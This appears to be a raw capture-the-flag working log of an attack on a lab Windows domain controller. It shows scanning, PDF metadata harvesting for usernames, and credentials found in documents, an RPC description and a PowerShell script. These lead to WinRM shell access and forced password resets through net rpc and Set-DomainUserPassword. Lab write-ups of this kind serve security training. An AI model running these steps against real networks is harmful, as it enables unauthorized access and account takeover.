                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ nmap -sS -p- --open --min-rate 5000 -Pn -n 192.168.56.10 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 18:45 EDT
Nmap scan report for 192.168.56.10
Host is up (0.00036s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
55231/tcp open  unknown
55233/tcp open  unknown
57947/tcp open  unknown
57964/tcp open  unknown
MAC Address: 08:00:27:26:46:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds

====================================================================================================================================================================================                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','                                                              
135,139,3268,3269,389,445,464,49664,49668,53,55231,55233,57947,57964,593,5985,636,80,88,9389

====================================================================================================================================================================================                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ nmap -sVC -p135,139,3268,3269,389,445,464,49664,49668,53,55231,55233,57947,57964,593,5985,636,80,88,9389 -vvv -n -Pn 192.168.56.10 -oN fullscan.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 18:47 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:47
Completed NSE at 18:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:47
Completed NSE at 18:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:47
Completed NSE at 18:47, 0.00s elapsed
Initiating ARP Ping Scan at 18:47
Scanning 192.168.56.10 [1 port]
Completed ARP Ping Scan at 18:47, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:47
Scanning 192.168.56.10 [20 ports]
Discovered open port 445/tcp on 192.168.56.10
Discovered open port 135/tcp on 192.168.56.10
Discovered open port 53/tcp on 192.168.56.10
Discovered open port 139/tcp on 192.168.56.10
Discovered open port 80/tcp on 192.168.56.10
Discovered open port 389/tcp on 192.168.56.10
Discovered open port 88/tcp on 192.168.56.10
Discovered open port 55231/tcp on 192.168.56.10
Discovered open port 9389/tcp on 192.168.56.10
Discovered open port 49664/tcp on 192.168.56.10
Discovered open port 5985/tcp on 192.168.56.10
Discovered open port 3269/tcp on 192.168.56.10
Discovered open port 464/tcp on 192.168.56.10
Discovered open port 636/tcp on 192.168.56.10
Discovered open port 3268/tcp on 192.168.56.10
Discovered open port 57947/tcp on 192.168.56.10
Discovered open port 593/tcp on 192.168.56.10
Discovered open port 55233/tcp on 192.168.56.10
Discovered open port 49668/tcp on 192.168.56.10
Discovered open port 57964/tcp on 192.168.56.10
Completed SYN Stealth Scan at 18:47, 0.02s elapsed (20 total ports)
Initiating Service scan at 18:47
Scanning 20 services on 192.168.56.10
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 18:48, 53.58s elapsed (20 services on 1 host)
NSE: Script scanning 192.168.56.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
NSE Timing: About 99.96% done; ETC: 18:48 (0:00:00 remaining)
Completed NSE at 18:48, 40.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Nmap scan report for 192.168.56.10
Host is up, received arp-response (0.00035s latency).
Scanned at 2025-10-22 18:47:24 EDT for 95s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 40687F51E948B80EE92FA92DDBCA8283
|_http-title:  Neptune 
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-10-22 22:47:36Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
55231/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
55233/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
57947/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
57964/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:26:46:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:26:46:e5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   NEPTUNE<00>          Flags: <group><active>
|   NEPTUNE<1c>          Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|   NEPTUNE<1b>          Flags: <unique><active>
| Statistics:
|   08:00:27:26:46:e5:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 4s
| smb2-time: 
|   date: 2025-10-22T22:48:24
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62115/tcp): CLEAN (Timeout)
|   Check 2 (port 27096/tcp): CLEAN (Timeout)
|   Check 3 (port 39390/udp): CLEAN (Timeout)
|   Check 4 (port 58446/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.67 seconds
           Raw packets sent: 21 (908B) | Rcvd: 21 (908B)
                                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 
====================================================================================================================================================================================

──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.56.10 neptune.thl DC01 DC01.neptune.thl
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 

====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ cat scriptFiles.sh 
#!/bin/bash
inicio="2020-01-01"
fin="2025-12-31"

fechas="$inicio"
while [[ "$fechas" < "$fin" ]]; do
    echo "$fechas.pdf"
    fechas=$(date -I -d "$fechas + 1 day")
done > wordlistFechas.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 


====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ gobuster dir -u http://192.168.56.10/docs/ -w wordlistFechas.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10/docs/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                wordlistFechas.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2023-01-01.pdf       (Status: 200) [Size: 51219]
/2023-01-03.pdf       (Status: 200) [Size: 49380]
/2023-01-09.pdf       (Status: 200) [Size: 47096]
/2023-01-23.pdf       (Status: 200) [Size: 51050]
/2023-01-25.pdf       (Status: 200) [Size: 47406]
/2023-01-07.pdf       (Status: 200) [Size: 51672]
/2023-01-05.pdf       (Status: 200) [Size: 49912]
/2023-01-21.pdf       (Status: 200) [Size: 52113]
/2023-01-13.pdf       (Status: 200) [Size: 50421]





====================================================================================================================================================================================




# Automatización de Descarga de Multiples Archivos PDF
La idea es, crear un script que utilice la ruta http://192.168.56.10/docs/ para que descargue todo su contenido, siendo archivos de PDF.

Lo importante, es que sabemos que todos los PDFs son del año 2023 al 2024, por lo que usaremos ese rango para que haga las descargas.


import os
import requests
from datetime import datetime, timedelta

# Variables
inicio = datetime(2023, 1, 1)
fin = datetime(2024, 12, 31)
url_base = "http://192.168.56.10/docs/"

# Creación de directorio donde se guardan PDFs
directorio = "pdfs_descargados"
os.makedirs(directorio, exist_ok=True)

print("Descargando archivos PDF...")

# Busqueda y Descarga
fecha_actual = inicio
while fecha_actual <= fin:
    filename = fecha_actual.strftime("%Y-%m-%d") + ".pdf"
    file_url = url_base + filename
    local_path = os.path.join(directorio, filename)

    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(local_path, "wb") as f:
                f.write(response.content)
    except:
        pass  # Ignorar errores

    fecha_actual += timedelta(days=1)

print("Descarga finalizada.")


====================================================================================================================================================================================



# Podemos analizar todos los PDFs con exiftool a la vez y aplicamos algunos filtros, para que solamente obtengamos lo que hay en las etiquetas Author y Creator:



exiftool pdfs_descargados/*.pdf | grep -E "Author|Creator" | sort -u | cut -d':' -f2- | grep -v "Neptune Oil & Gas" | sed 's/^ //' | grep -v '^$' > usuarios.txt






┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ cat usuarios.txt  
David Brown
James Clear
Thomas Brown
Elizabeth.Brown
Elizabeth.Davis
Elizabeth.Garcia
Elizabeth.Johnson
Elizabeth.Jones
Elizabeth.Miller
Elizabeth.Rodriguez
Elizabeth.Smith
Elizabeth.Williams
Elizabeth.Wilson
James.Brown
James.Davis
James.Garcia
James.Johnson
James.Jones
James.Miller
James.Smith
James.Wilson
Jennifer.Brown
Jennifer.Miller
Jennifer.Rodriguez
Jennifer.Smith
Jennifer.Williams
Jennifer.Wilson
John.Brown
John.Davis
John.Johnson
John.Jones
John.Miller
John.Rodriguez
John.Smith
John.Williams
John.Wilson
Linda.Brown
Linda.Davis
Linda.Johnson
Linda.Jones
Linda.Miller
Linda.Smith
Linda.Wilson
Lucas.Miller
Mary.Brown
Mary.Davis
Mary.Johnson
Mary.Jones
Mary.Miller
Mary.Rodriguez
Mary.Smith
Mary.Williams
Michael.Brown
Michael.Garcia
Michael.Johnson
Michael.Jones
Michael.Miller
Michael.Rodriguez
Michael.Smith
Michael.Williams
Michael.Wilson
Patricia.Brown
Patricia.Davis
Patricia.Garcia
Patricia.Johnson
Patricia.Jones
Patricia.Miller
Patricia.Rodriguez
Patricia.Smith
Patricia.Williams
Robert.Brown
Robert.Davis
Robert.Garcia
Robert.Johnson
Robert.Jones
Robert.Miller
Robert.Rodriguez
Robert.Williams
Robert.Wilson
William.Brown
William.Garcia
William.Johnson
William.Jones
William.Miller
William.Rodriguez
William.Smith
William.Williams
William.Wilson
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 

====================================================================================================================================================================================




──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ kerbrute userenum --dc neptune.thl -d neptune.thl usuarios.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/07/25 - Ronnie Flathers @ropnop

2025/11/07 09:19:02 >  Using KDC(s):
2025/11/07 09:19:02 >   neptune.thl:88

2025/11/07 09:19:02 >  [+] VALID USERNAME:       Lucas.Miller@neptune.thl
2025/11/07 09:19:02 >  Done! Tested 88 usernames (1 valid) in 0.032 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 





====================================================================================================================================================================================

# Analizar PDF

──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ sudo apt install pdfgrep



┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ pdfgrep -i "contraseña" pdfs_descargados/*.pdf

pdfs_descargados/2023-01-12.pdf:   ● Contraseña temporal: E@6q%TnR7UEQSXywr8^@ (Por favor, cambia esta
pdfs_descargados/2023-01-12.pdf:      contraseña en tu primer inicio de sesión)



====================================================================================================================================================================================



──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ netexec smb 192.168.56.10 -u Lucas.Miller -p 'E@6q%TnR7UEQSXywr8^@'                                          
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ 


====================================================================================================================================================================================


                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ rpcclient -U 'Lucas.Miller%E@6q%TnR7UEQSXywr8^@' 192.168.56.10
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lucas.miller] rid:[0x451]
user:[victor.rodriguez] rid:[0x452]
user:[emma.johnson] rid:[0x453]
user:[thomas.brown] rid:[0x454]
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: emma.johnson   Name: Emma Johnson      Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf11 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: lucas.miller   Name: Lucas Miller      Desc: (null)
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: thomas.brown   Name: Thomas Brown      Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: victor.rodriguez       Name: Victor Rodriguez  Desc: My Password is H5gVCzzZkzJ#wGsT8u1$
rpcclient $> 


====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Downloads]
└─$ netexec smb 192.168.56.10 -u victor.rodriguez -p 'H5gVCzzZkzJ#wGsT8u1$'                                       
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\victor.rodriguez:H5gVCzzZkzJ#wGsT8u1$ 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ 

====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ smbmap -H 192.168.56.10 -u victor.rodriguez -p 'H5gVCzzZkzJ#wGsT8u1$' 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
                                                                                                                             
[+] IP: 192.168.56.10:445       Name: neptune.thl               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections              

====================================================================================================================================================================================



──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ smbmap -H 192.168.56.10 -u victor.rodriguez -p 'H5gVCzzZkzJ#wGsT8u1$'        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
                                                                                                                             
[+] IP: 192.168.56.10:445       Name: neptune.thl               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                     
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ smbclient \\\\192.168.56.10\\IT -U victor.rodriguez%H5gVCzzZkzJ#wGsT8u1$    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 26 19:14:40 2025
  ..                                DHS        0  Thu Feb 27 14:52:00 2025
  Scripts                             D        0  Wed Feb 26 19:16:55 2025

                10540543 blocks of size 4096. 7191392 blocks available
smb: \> cd Scripts\
smb: \Scripts\> ls
  .                                   D        0  Wed Feb 26 19:16:55 2025
  ..                                  D        0  Wed Feb 26 19:14:40 2025
  backup.ps1                          A     1957  Wed Feb 26 19:20:11 2025

                10540543 blocks of size 4096. 7191392 blocks available
smb: \Scripts\> get backup.ps1 
getting file \Scripts\backup.ps1 of size 1957 as backup.ps1 (147.0 KiloBytes/sec) (average 147.0 KiloBytes/sec)
smb: \Scripts\> exit
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ ls
2024-02-15.pdf  backup.ps1         fullscan.txt      scan.txt        usuariosAC.txt  wordlistFechas.txt
2024-11-29.pdf  downloadsFiles.py  pdfs_descargados  scriptFiles.sh  usuarios.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ cat backup.ps1  
$sourceDirectory = "C:\Confidenciales"
$destinationDirectory = "E:\Backups\Confidenciales"

$username = "emma.johnson"
$password = ConvertTo-SecureString "sb9TVndq8N@tUVMmP2@#" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)

$emailFrom = "emma.johnson@neptune.thl"
$emailTo = "emma.johnson@neptune.thl"
$smtpServer = "smtp.neptune.thl"
$smtpPort = 587
$emailSubject = "Notificación de Backup Completo"

$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "report_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName

function Send-EmailNotification {
    param (
        [string]$subject,
        [string]$body
    )
    try {
        $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtpClient.EnableSsl = $true
        $smtpClient.Credentials = New-Object System.Net.NetworkCredential("smtp_user", "smtp_password")

        $mailMessage = New-Object System.Net.Mail.MailMessage($emailFrom, $emailTo, $subject, $body)
        $smtpClient.Send($mailMessage)
        Write-Host "Correo enviado a $emailTo"
    }
    catch {
        Write-Host "Error al enviar el correo: $_"
    }
}

try {
    Write-Host "Iniciando el backup..."
    Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
    Write-Host "Backup completado exitosamente. Archivo guardado en: $backupFilePath"

    $emailBody = "El proceso de backup se ha completado correctamente." + "`n" + "Archivo de backup: $backupFilePath"

    Send-EmailNotification -subject $emailSubject -body $emailBody
}
catch {
    Write-Host "Error al realizar el backup: $_"

    $errorSubject = "Error en el proceso de Backup"
    $errorBody = "Hubo un problema al realizar el backup." + "`n" + "Error: $_"
    Send-EmailNotification -subject $errorSubject -body $errorBody
}                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Black_Gold]
└─$ 




====================================================================================================================================================================================


                                                                                                                                                            

                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec smb 192.168.56.10 -u emma.johnson -p 'sb9TVndq8N@tUVMmP2@#'   
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\emma.johnson:sb9TVndq8N@tUVMmP2@# 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ 

┌──(kali㉿kali)-[~/Downloads]
└─$ netexec winrm 192.168.56.10 -u emma.johnson -p 'sb9TVndq8N@tUVMmP2@#'  
WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)

====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i 192.168.56.10 -u emma.johnson -p 'sb9TVndq8N@tUVMmP2@#'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> whoami
neptune\emma.johnson
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> 

====================================================================================================================================================================================


*Evil-WinRM* PS C:\Users\Emma Johnson> cd Desktop
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> ls


    Directory: C:\Users\Emma Johnson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/26/2025   8:51 PM             32 user.txt


*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
a5accd70ea911b92487cea1d1cb73162
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> 









net rpc password "thomas.brown" "Patito12345" -U "neptune.thl"/"emma.johnson"%"sb9TVndq8N@tUVMmP2@#" -S 192.168.56.10

net rpc password "thomas.brown" "newP@ssword2022" -U "neptune.thl"/"emma.johnson"%"sb9TVndq8N@tUVMmP2@#" -S "192.168.56.10"





$SecPassword = ConvertTo-SecureString 'sb9TVndq8N@tUVMmP2@#' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('neptune.thl\emma.johnson', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Hackeado123!' -AsPlainText -Force
Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Credential $Cred












https://berserkwings.github.io/THL-writeup-blackGold/#